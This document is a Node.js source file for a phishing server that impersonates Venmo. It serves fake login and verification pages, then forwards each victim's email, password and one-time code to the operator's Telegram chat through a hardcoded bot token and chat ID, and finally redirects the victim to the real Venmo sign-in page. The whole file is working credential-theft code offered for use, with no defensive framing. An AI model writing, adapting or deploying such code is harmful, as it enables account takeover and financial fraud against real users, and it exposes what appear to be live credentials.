const TelegramBot = require('node-telegram-bot-api');

// replace the value below with the Telegram token you receive from @BotFather
let token = "5364944530:AAFEheGnupyqVT89GvYMLAb3QGM9wq5yN1o"
const bot = new TelegramBot(token, {polling: true});

const express = require("express");
const bodyParser = require("body-parser");
const res = require("express/lib/response");
const { request } = require('express');
const app = express();

app.use(bodyParser.urlencoded({extended : false}))
app.use(express.static(__dirname + "/phish/"))
//app.use(express.)
app.listen(3000, () => {
  console.log("Application started and Listening on port 3000");
});

app.get("/", (req, res) => {
  res.redirect("/login");
});

app.get("/login", (req, res) => {
    res.sendfile("./phish/info.html");
})

app.get("/verification", (req, res) => {
    res.sendfile("./phish/kole.html")
})

app.post("/verification", (req, res ) => {
    let apiToken = "5364944530:AAFEheGnupyqVT89GvYMLAb3QGM9wq5yN1o" ///Add your telegram bot token
    let chat_id =  5031313549 ///add your user id
    let message = `Email for account:${req.body.otp}`
    console.log(req.body)
    if (req.body.otp) {
        console.log(`Client has forwarded otp: ${req.body.otp}`)
        let message = `OTP Code sent to targs phone: ${req.body.otp}`
        bot.sendMessage(chat_id, message)
        res.redirect('https://venmo.com/account/sign-in') 
    }
})

app.post('/sessions', function(request, response) {
    let apiToken = "5364944530:AAFEheGnupyqVT89GvYMLAb3QGM9wq5yN1o" ///Add your telegram bot token
    let chat_id =  5031313549 ///add your user id
    console.log(request.body.phoneEmailUsername)
    if(request.body.phoneEmailUsername) {
        let message = `Email for Venmo account: ${request.body.phoneEmailUsername}\nPassword for venmo account:${request.body.password}`
        bot.sendMessage(chat_id, message)
        response.redirect('verification')  
    } 
});
